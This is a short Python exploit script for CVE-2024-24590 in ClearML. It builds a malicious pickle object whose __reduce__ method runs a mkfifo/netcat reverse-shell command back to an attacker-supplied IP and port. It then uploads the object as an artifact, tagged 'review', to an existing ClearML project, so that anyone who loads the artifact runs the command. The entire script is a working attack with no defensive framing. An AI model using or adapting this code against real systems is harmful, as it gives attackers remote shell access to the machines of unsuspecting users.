from clearml import Task
import pickle, os
import argparse, sys

parser = argparse.ArgumentParser(description='CVE-2024-24590.')
parser.add_argument('-i', dest='ip', metavar='IP', type=str, required=True,
                    help='IP address to connect')
parser.add_argument('-p', dest='port', metavar='PORT', type=int, required=True,
                    help='Port number to connect')
parser.add_argument('-P', dest='project', metavar='PROJECT', type=str, required=True,
                    help='Name of the existing project')

if len(sys.argv)!=7:
    parser.print_help(sys.stderr)
    sys.exit(1)

args = parser.parse_args()

class Exploit:
    def __reduce__(self):
        return (os.system, (f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {args.ip} {args.port} >/tmp/f',))

task = Task.init(project_name=args.project, task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=Exploit(), retries=2, wait_on_upload=True, extension_name=".pkl")
